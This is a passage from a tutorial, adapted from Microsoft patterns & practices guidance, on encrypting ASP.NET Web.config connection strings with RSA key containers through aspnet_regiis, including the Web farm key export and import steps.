identity.</p><p>RSA user-level key containers are stored in the following folder:</p><p>\Documents and Settings\{UserName}\Application Data\Microsoft\Crypto\RSA</p><h1>Step 3. Encrypt Your Configuration File Data</h1><p>This step shows you how to encrypt a connection string in the Web.config file. It shows you how to do this with the machine store and then with the user store.</p><h2>Using RSA with a Machine-Level Key Container to Encrypt a Connection String in Web.Config</h2><p>The <strong>RSAProtectedConfigurationProvider</strong> is the default provider and is configured to use the machine-level key container.</p><h3>To encrypt the connectionStrings section in Web.config </h3><ol><li>Create a new Web site named MachineRSA. Make sure that this directory is configured as a virtual directory. </li><li>Add a Web.config configuration file to this directory. </li><li>Add a sample <strong>connectionString</strong> similar to the following example: <div><pre>&lt;connectionStrings&gt;<br>&nbsp; &lt;add name="MyLocalSQLServer" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionString="Initial Catalog=aspnetdb;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data source=localhost;Integrated Security=SSPI;" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; providerName="System.Data.SqlClient"/&gt;<br>&lt;/connectionStrings&gt;  </pre></div></li><li>Run the following command from a .NET command prompt to encrypt the <strong>connectionStrings</strong> section: <p><strong>aspnet_regiis -pe "connectionStrings" -app "/MachineRSA"</strong> </p><p>The above command with the-<strong>app</strong> switch assumes that there is an IIS virtual directory called MachineRSA. If you are using the Visual Studio Web server instead of IIS, use the-<strong>pef</strong> switch, which allows you to specify the physical directory location of your configuration file. </p><p><strong>aspnet_regiis.exe -pef "connectionStrings" C:\Projects\MachineRSA</strong> </p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;The Aspnet_regiis.exe utility tool is located in the following directory:</blockquote><blockquote>%WinDir%\Microsoft.NET\Framework\&lt;<em>versionNumber</em>&gt;</blockquote><ul><li>The <strong>-pe</strong> switch specifies the configuration section to encrypt. This is the XML element name of the configuration section. <p>For nested elements, such as the &lt;<strong>pages</strong>&gt; section which is inside &lt;<strong>system.web</strong>&gt;, the XML name must include the containing section groups; for example: <strong>"system.web/pages"</strong>. </p></li><li>The <strong>-pef</strong> switch specifies the configuration section to encrypt and allows you to supply the physical directory path for your configuration file. </li><li>The <strong>-app</strong> switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example, <strong>"/test/aspnet/MachineRSA"</strong>. </li><li>Because you are using the default provider with default settings, you do not need to use the-<strong>prov</strong> switch, which specifies the provider name. </li></ul><p>If the command is successful, you will see the following output: </p><div><pre>Encrypting configuration section...Succeeded!  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;The RSA machine key containers are stored in the following folder:</blockquote><blockquote>\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys</blockquote></li><li>Review the Web.config file, and examine the changes. The following elements are created: <ul><li>&lt;<strong>EncryptedData</strong>&gt; </li><li>&lt;<strong>EncryptionMethod</strong>&gt; </li><li>&lt;<strong>KeyInfo</strong>&gt; </li><li>&lt;<strong>EncryptedKey</strong>&gt; </li><li>&lt;<strong>KeyName</strong>&gt; </li><li>&lt;<strong>CipherData</strong>&gt; </li><li>&lt;<strong>CipherValue</strong>&gt; </li></ul><p>Your modified Web.Config file, with the <strong>connectionStrings</strong> section encrypted, should be similar to the following example: </p><div><pre>...<br>&lt;connectionStrings configProtectionProvider="RsaProtectedConfigurationProvider"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;EncryptedData Type="<a href="http://www.w3.org/2001/04/xmlenc#Element">http://www.w3.org/2001/04/xmlenc#Element</a>"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;              xmlns="<a href="http://www.w3.org/2001/04/xmlenc">http://www.w3.org/2001/04/xmlenc</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptionMethod Algorithm="<a href="http://www.w3.org/2001/04/xmlenc#tripledes-cbc">http://www.w3.org/2001/04/xmlenc#tripledes-cbc</a>" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyInfo xmlns="<a href="http://www.w3.org/2000/09/xmldsig">http://www.w3.org/2000/09/xmldsig</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptedKey xmlns="<a href="http://www.w3.org/2001/04/xmlenc">http://www.w3.org/2001/04/xmlenc</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptionMethod Algorithm="<a href="http://www.w3.org/2001/04/xmlenc#rsa-1_5">http://www.w3.org/2001/04/xmlenc#rsa-1_5</a>" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyInfo xmlns="<a href="http://www.w3.org/2000/09/xmldsig">http://www.w3.org/2000/09/xmldsig</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyName&gt;Rsa Key&lt;/KeyName&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/KeyInfo&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherValue&gt;R7cyuRk+SXJoimz7wlOpJr/YLeADGnwJVcmElHbrG/<br>                         B5dDTE4C9rzSmmTsbJ9Xcl2oDQt1qYma9L7pzQsQQYqLrkajqJ4i6ZQH1cmiot8ja7Vh+yItes7TRU1AoXN9T0mbX5H1Axm0O3X/<br>                         285/MdXXTUlPkDMAZXmzNVeEJHSCE=<br>            &lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/EncryptedKey&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/KeyInfo&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherValue&gt;d2++QtjcVwIkJLsye+dNJbCveORxeWiVSJIbcQQqAFofhay1wMci8FFlbQWttiRYFcvxrmVfNSxoZV8GjfPtppiodhOzQZ+0/<br>                     QIFiU9Cifqh/T/7JyFkFSn13bTKjbYmHObKAzZ+Eg6gCXBxsVErzH9GRphlsz5ru1BytFYxo/<br>                     lUGRvZfpLHLYWRuFyLXnxNoAGfL1mpQM7M46x5YWRMsNsNEKTo/PU9/Jvnh/<br>                     lT+GlcgCs2JRpyzSfKE7zSJH+TpIRtd86PwQ5HG3Pd2frYdYw0rmlmlI9D<br>        &lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/EncryptedData&gt;<br>&nbsp; &lt;/connectionStrings&gt;<br>...</pre></div></li><li>Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption work correctly. <div><pre>&lt;%@ Page Language="C#" %&gt;<br>&lt;script runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; protected void Page_Load(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Clear text connection string is: " + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       ConfigurationManager.ConnectionString["MyLocalSQLServer"].ConnectionString);<br>&nbsp;&nbsp;&nbsp; }<br>&lt;/script&gt;<br>&lt;html&gt;<br>&nbsp; &lt;body /&gt;<br>&lt;/html&gt;  </pre></div></li><li><p>MyLocalSQLServer is the name of the connection string you previously specified in the Web.config file. </p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;If your ASP.NET application identity does not have access to the .NET Framework configuration key store, the following message is returned:</blockquote><div><pre>Parser Error Message: Failed to decrypt using provider 'RsaProtectedConfigurationProvider'.<br>Error message from the provider: The handle is invalid.  </pre></div><blockquote><strong><strong>To </strong>grant access to the ASP.NET application identity</strong></blockquote><ol><li>If you are not sure which identity to use, check the identity from a Web page by using the following code: <div><pre>using System.Security.Principal;<br>...<br>protected void Page_Load(object sender, EventArgs e)<br>{<br>&nbsp; Response.Write(WindowsIdentity.GetCurrent().Name);<br>}  </pre></div></li><li>By default, ASP.NET applications on Windows Server 2003 run using the NT Authority\Network Service account. Open a .NET command prompt, and use the following command to give this account access to the NetFrameworkConfigurationKey store: <blockquote><strong><strong>aspnet_regiis</strong> -pa "NetFrameworkConfigurationKey" "NT Authority\Network Service"</strong></blockquote><blockquote><strong>If</strong> the command runs successfully you will see the following output:</blockquote><div><pre>Adding ACL for access to the RSA Key container...Succeeded!  </pre></div><blockquote><strong>You </strong>can check the ACL of the file in the following folder:</blockquote><blockquote><strong><strong>\Documents</strong> and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys</strong></blockquote><blockquote><strong>Your</strong><strong> </strong>RSA key container file is the file in this folder with the most recent timestamp.</blockquote></li></ol></li><li>To change the <strong>connectionStrings</strong> section back to clear text, run the following command from the command prompt: <p><strong>aspnet_regiis -pd "connectionStrings" -app "/MachineRSA"</strong> </p><p>If the command is successful, you will see the following output: </p><div><pre>Decrypting configuration section...Succeeded!  </pre></div><p>To decrypt the <strong>connectionStrings</strong> section that specifies a physical path to your application's configuration file, use the <strong>-pdf</strong> switch as shown here. </p><p><strong>aspnet_regiis -pdf "connectionStrings" C:\Projects\MachineRSA</strong> </p></li></ol><h2>Using RSA with a User-level Key Container to Encrypt a Connection String in Web.config</h2><p>The following steps show you how to encrypt a &lt;<strong>connectionStrings</strong>&gt; section by using the <strong>RSAProtectedConfigurationProvider</strong> (RSA) with a user-level key container.</p><p>By default, the ASP.NET applications run under the NT AUTHORITY \ Network Service account. When you access encrypted configuration sections using RSA encryption with the user-level key container, make sure that your application is running with the same user identity as the account you used to encrypt the data. </p><h3>To encrypt the connectionStrings section in Web.config </h3><ol><li>Create a new Web site named UserRSA. Make sure that this directory is configured as a virtual directory. </li><li>Add a Web.config configuration file to this directory. </li><li>Add a sample <strong>connectionString</strong> similar to the following example: <div><pre>&lt;connectionStrings&gt;<br>&nbsp; &lt;add name="MyLocalSQLServer" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionString="Initial Catalog=aspnetdb;data source=localhost;Integrated Security=SSPI;"<br>       providerName="System.Data.SqlClient" /&gt;<br>&lt;/connectionStrings&gt;  </pre></div></li><li>Add and configure a protected configuration provider to use a user-level key container. To do this, add the following &lt;<strong>configProtectedData</strong>&gt; section to your Web.config file. You must set <strong>useMachineContainer</strong>=<strong> "false"</strong> to instruct the provider to use the user-level key container. You must also use a unique provider name or a run-time error will be generated. <div><pre>&lt;configProtectedData&gt;<br>&nbsp; &lt;providers&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;add keyContainerName="NetFrameworkConfigurationKey"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    useMachineContainer="false"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    description="Uses RsaCryptoServiceProvider to encrypt and decrypt"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    name="MyUserRSAProtectedConfigurationprovider" <br>         type="System.Configuration.RsaProtectedConfigurationProvider,System.Configuration,<br>               Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/providers&gt;&nbsp;&nbsp; <br>&lt;/configProtectedData&gt;  </pre></div></li><li>Run the following command from an SDK Command Prompt to encrypt the <strong>connectionStrings</strong> section: <p><strong>aspnet_regiis -pe "connectionStrings" -app "/UserRSA" -prov "MyUserRSAProtectedConfigurationProvider"</strong> </p><ul><li>The <strong>-pe</strong> switch specifies the configuration section to encrypt. This is the XML element name of the configuration section. <p>For nested elements, such as the &lt;<strong>pages</strong>&gt; section, which is inside &lt;<strong>system.web</strong>&gt;, the XML name must include the containing section groups; for example, <strong>"system.web/pages"</strong>. </p></li><li>The <strong>-app</strong> switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example, <strong>"/test/aspnet/MachineRSA"</strong>. </li><li>The <strong>-prov</strong> switch specifies the provider name. In this case, this is set to <strong>"MyUserRSAProtectedConfigurationProvider"</strong> which is the name you specified when configuring the provider in step 4. </li></ul><p>If the command is successful, you will see the following output: </p><div><pre>Encrypting configuration section...Succeeded!  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;RSA user-level key containers are stored in the following folder.</blockquote><blockquote>\Documents and Settings\{UserName}\Application Data\Microsoft\Crypto\RSA</blockquote></li><li>Review the Web.config and examine the changes. The following elements are created. <ul><li>&lt;<strong>EncryptedData</strong>&gt; </li><li>&lt;<strong>EncryptionMethod</strong>&gt; </li><li>&lt;<strong>KeyInfo</strong>&gt; </li><li>&lt;<strong>EncryptedKey</strong>&gt; </li><li>&lt;<strong>KeyName</strong>&gt; </li><li>&lt;<strong>CipherData</strong>&gt; </li><li>&lt;<strong>CipherValue</strong>&gt; </li></ul><p>Your modified Web.Config file, with the <strong>connectionStrings</strong> section encrypted, should be similar to the following example: </p><div><pre>...<br>  &lt;connectionStrings configProtectionProvider="MyUserRSAProtectedConfigurationprovider"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;EncryptedData Type="<a href="http://www.w3.org/2001/04/xmlenc#Element">http://www.w3.org/2001/04/xmlenc#Element</a>"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;              xmlns="<a href="http://www.w3.org/2001/04/xmlenc">http://www.w3.org/2001/04/xmlenc</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptionMethod Algorithm="<a href="http://www.w3.org/2001/04/xmlenc#tripledes-cbc">http://www.w3.org/2001/04/xmlenc#tripledes-cbc</a>" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyInfo xmlns="<a href="http://www.w3.org/2000/09/xmldsig">http://www.w3.org/2000/09/xmldsig</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptedKey xmlns="<a href="http://www.w3.org/2001/04/xmlenc">http://www.w3.org/2001/04/xmlenc</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptionMethod Algorithm="<a href="http://www.w3.org/2001/04/xmlenc#rsa-1_5">http://www.w3.org/2001/04/xmlenc#rsa-1_5</a>" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyInfo xmlns="<a href="http://www.w3.org/2000/09/xmldsig">http://www.w3.org/2000/09/xmldsig</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyName&gt;Rsa Key&lt;/KeyName&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/KeyInfo&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherValue&gt;In7jNc0GA1eE5nvVR2hrHQ6cC1O1kMbfBXH0alBwlY2OBM4sMa8NbK4pBnUdxFkrx+oSzLYE8SHS6dYZwE3Uf5x7hk46Jx+Z/<br>                         hn1hneWMyxWn23t41708lQzySsotYnzL5VOdR4P7MrIlhW9eSpbWp7PopSzcLxlGbs41dH7L3E=<br>            &lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/EncryptedKey&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/KeyInfo&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherValue&gt;Zbu2LQQeiHaUFXWPjLvPR9OLwrozCZj5i2zvcEFlx/<br>                     UICt2Cn0fTdy51dbHQRjTUXnOyx2PC5vptALXsvxrhPo5I+<br>                     I2SCr21rRUQ5H55P0ejJZMsAirkNjdhCe5RflVLdK96a6Sw0cz93inWi4rNkE1SiXB76cD08Y+DHrsjmGkW8/<br>                     TeHCK2f4xSykmdJGRwpxxdt2+3DxMjQPfg39Xkr4JjRlE6FvQ/R6hkEyyqLmCxUxbTV/<br>                     +mcBcwyE3AzrbOIl+627SG1fP4ovLmMkNvjlTl5lCZnoj6<br>        &lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/EncryptedData&gt;<br>&nbsp; &lt;/connectionStrings&gt;<br>...</pre></div></li><li>Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption works correctly. <div><pre>&lt;%@ Page Language="C#" %&gt;<br>&lt;script runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; protected void Page_Load(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Clear text connection string is: " + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;            ConfigurationManager.ConnectionStrings["MyLocalSQLServer"].ConnectionString);<br>&nbsp;&nbsp;&nbsp; }<br>&lt;/script&gt;<br>&lt;html&gt;<br>&nbsp; &lt;body /&gt;<br>&lt;/html&gt;  </pre></div></li><li><p>Because your application must access the data using the same identity that you used to encrypt the data, you often need to run the encryption command using your application's service account identity. To do so, you can start a command Window by using the <strong>runas</strong> command as shown below specifying an appropriate domain and user name. </p><p><strong>Runas /profile /user:domain\user cmd</strong> </p><p>When you run Aspnet_regiis from the resulting command window, it uses the specified identity to perform the encryption. This allows the application that uses the same identity to decrypt the data at run time. </p><p>If your application runs under a different account than the one used to encrypt the data, ASP.NET will be unable to access the RSA user-level key container and will generate the following error: </p><div><pre>Parser Error Message: Failed to decrypt using provider 'RsaProtectedConfigurationProvider'. <br>Error message from the provider: Keyset does not exist  </pre></div></li><li>To change the <strong>connectionStrings</strong> section back to clear text, run the following command from the .NET command prompt: <p><strong>aspnet_regiis -pd "connectionStrings" -app "/UserRSA"</strong> </p><p>If the command is successful, you will see the following output: </p><div><pre>Decrypting configuration section...Succeeded!  </pre></div></li></ol><h1>Web Farm Scenarios</h1><p>You can use RSA encryption in Web farms, because you can export RSA keys. You need to do this if you encrypt data in a Web.config file prior to deploying it to other servers in a Web farm. In this case, the private key required to decrypt the data must be exported and deployed to the other servers.</p><h2>Using the RSA Provider to Encrypt a Connection String in Web.config in a Web Farm</h2><p>To do this, you must create a custom RSA encryption key container and deploy the same key container on all servers in your Web farm. This won't work by default because the default RSA encryption key, <strong>"NetFrameworkConfigurationKey"</strong>, is different for each computer.</p><h3>To use RSA encryption in a Web farm </h3><ol><li>Run the following command from a command prompt to create a custom RSA encryption key: <p><strong>aspnet_regiis -pc "CustomKeys" -exp</strong> </p><p>The <strong>-exp</strong> switch indicates that the keys are exportable. </p><p>If the command is successful, you will see the following output: </p><div><pre>Creating RSA Key container...Succeeded!  </pre></div><p>You can verify that a custom key container exists by looking for the file and checking timestamps in the following location: </p><p>\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA<br>\MachineKeys </p></li><li>Create a new Web project named WebFarmRSA. Make sure that this directory is configured as a virtual directory. </li><li>Add a Web.config configuration file to this directory. </li><li>Add a sample <strong>connectionString</strong> similar to the following example: <div><pre>&lt;connectionStrings&gt;<br>&nbsp; &lt;add name="MyLocalSQLServer" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionString="Initial Catalog=aspnetdb;data source=localhost;Integrated Security=SSPI;" <br>       providerName="System.Data.SqlClient" /&gt;<br>&lt;/connectionStrings&gt;  </pre></div></li><li>Add and configure a custom protected configuration provider. To do this, add the following &lt;<strong>configProtectedData</strong>&gt; section to the Web.config file. Note that the key container name is set to <strong>"CustomKeys"</strong>, which is the name of the key container created previously. <div><pre>...<br>&lt;configProtectedData&gt;<br>&nbsp; &lt;providers&gt;<br>&nbsp; &lt;add keyContainerName="CustomKeys" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;useMachineContainer="true"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;description="Uses RsaCryptoServiceProvider to encrypt and decrypt"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name="CustomProvider"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; type="System.Configuration.RsaProtectedConfigurationProvider,System.Configuration,<br>             Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" /&gt;<br>&nbsp; &lt;/providers&gt;<br>&lt;/configProtectedData&gt;<br>...  </pre></div></li><li>Run the following command from an SDK Command Prompt to encrypt the <strong>connectionStrings</strong> section using the custom RSA key: <p><strong>aspnet_regiis -pe "connectionStrings" -app "/WebFarmRSA" -prov "CustomProvider"</strong> </p><p>If the encryption is successful, you will see the following output: </p><div><pre>Encrypting configuration section...Succeeded!  </pre></div></li><li>Review the Web.config file and examine the changes. The following elements are modified: <ul><li>&lt;<strong>EncryptedData</strong>&gt; </li><li>&lt;<strong>CipherData</strong>&gt; </li><li>&lt;<strong>CipherValue</strong>&gt; </li></ul><p>Your modified Web.Config file, with the <strong>connectionStrings</strong> section encrypted, should be similar to the following example: </p><div><pre>...<br>  &lt;connectionStrings configProtectionProvider="CustomProvider"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;EncryptedData Type="<a href="http://www.w3.org/2001/04/xmlenc#Element">http://www.w3.org/2001/04/xmlenc#Element</a>"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;              xmlns="<a href="http://www.w3.org/2001/04/xmlenc">http://www.w3.org/2001/04/xmlenc</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptionMethod Algorithm="<a href="http://www.w3.org/2001/04/xmlenc#tripledes-cbc">http://www.w3.org/2001/04/xmlenc#tripledes-cbc</a>" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyInfo xmlns="<a href="http://www.w3.org/2000/09/xmldsig">http://www.w3.org/2000/09/xmldsig</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptedKey xmlns="<a href="http://www.w3.org/2001/04/xmlenc">http://www.w3.org/2001/04/xmlenc</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EncryptionMethod Algorithm="<a href="http://www.w3.org/2001/04/xmlenc#rsa-1_5">http://www.w3.org/2001/04/xmlenc#rsa-1_5</a>" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyInfo xmlns="<a href="http://www.w3.org/2000/09/xmldsig">http://www.w3.org/2000/09/xmldsig</a>#"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;KeyName&gt;Rsa Key&lt;/KeyName&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/KeyInfo&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherValue&gt;MWOaFwkByLRrvoGYeFUPMmN7e9uwC0D7gFEeyxs3Obll710dLQvD5XaMWcRxg1WwtOE9nysPQRrIJUaCm0b26LGUoa/<br>                         giGEfvWnslU2kig9SPICzsQAqUSB/inhRckWceb2xdy7TT+EI/vfsu6itJwE2AicMCTwx5I828mP8lV4=<br>            &lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/EncryptedKey&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/KeyInfo&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherValue&gt;IKO9jezdlJ/k1snyw5+e11cd9IVTlVfHBHSiYLgICf1EnMNd5WxVDZWP1uOW2UaY3Muv7HrSZCRbqq6hfA2uh2rxy5qAzFP+iu7Sg/<br>                     ku1Zvbwfq8p1UWHvPCukeyrBypiv0wpJ9Tuif7oP4Emgaoa+ewLnETSN411Gow28EKcLpbKWJDOC/<br>                     9o7g503YM4cnIvkQOomkYlL+MzMb3Rc1FSLiM9ncKQLZi+<br>                     JkRhlDIxFlsrFpKJhdNf5A0Sq2P71ZLI6G6QDCehHyn3kCZyBmVWJ0ueoGWXV4y<br>        &lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/EncryptedData&gt;<br>&nbsp; &lt;/connectionStrings&gt;<br>...</pre></div></li><li>Run the following command from a .NET command prompt to export the custom RSA encryption key: <p><strong>aspnet_regiis -px "CustomKeys" "C:\CustomKeys.xml" -pri</strong> </p><p>The <strong>-pri</strong> switch causes the private and public key to be exported. This enables both encryption and decryption. Without the-<strong>pri</strong> switch, you would only be able to encrypt data with the exported key. </p><p>If the command is successful, you will see the following output: </p><div><pre>Exporting RSA Keys to file...Succeeded!  </pre></div></li><li>Deploy the application and the encrypted Web.config file on a different server computer. Also copy the CustomKeys.xml file to a local directory on the other server, for example to the C:\ directory. </li><li>On the destination server, run the following command from a command prompt to import the custom RSA encryption keys: <p><strong>aspnet_regiis -pi "CustomKeys" "C:\CustomKeys.xml"</strong> </p><p>If the command is successful, you will see the following output: </p><div><pre>Importing RSA Keys from file..Succeeded!  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;After you have finished exporting and importing the RSA keys, it is important for security reasons to delete the CustomsKeys.xml file from both machines. </blockquote></li><li>Grant access to the ASP.NET application identity. <p>The account used to run your Web application must be able to read the RSA key container. If you are not sure which identity your application uses, you can check this by adding the following code to a Web page: </p><div><pre>using System.Security.Principal;<br>...<br>protected void Page_Load(object sender, EventArgs e)<br>{<br>&nbsp;&nbsp;&nbsp; Response.Write(WindowsIdentity.GetCurrent().Name);<br>}  </pre></div><p>By default, ASP.NET applications on Windows Server 2003 run using the NT Authority\Network Service account. The following command grants this account access to the CustomKeys store: </p><p><strong>aspnet_regiis -pa "CustomKeys" "NT Authority\Network Service"</strong> </p><p>If the command runs successfully, you will see the following output. </p><div><pre>Adding ACL for access to the RSA Key container...Succeeded!  </pre></div><p>You can check the ACL of the file in the following folder: </p><div><pre>\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys  </pre></div><p>Your RSA key container file will be the one in this folder with the most recent timestamp. </p></li><li>Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption work correctly. <div><pre>&lt;%@ Page Language="C#" %&gt;<br>&lt;script runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; protected void Page_Load(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Clear text connection string is: " + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       ConfigurationManager.ConnectionStrings["MyLocalSQLServer"].ConnectionString);<br>&nbsp;&nbsp;&nbsp; }<br>&lt;/script&gt;<br>&lt;html&gt;<br>&nbsp; &lt;body/&gt;<br>&lt;/html&gt;  </pre></div></li></ol><p>MyLocalSQLServer is the name of the connection string you specified previously in the Web.config file. </p><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
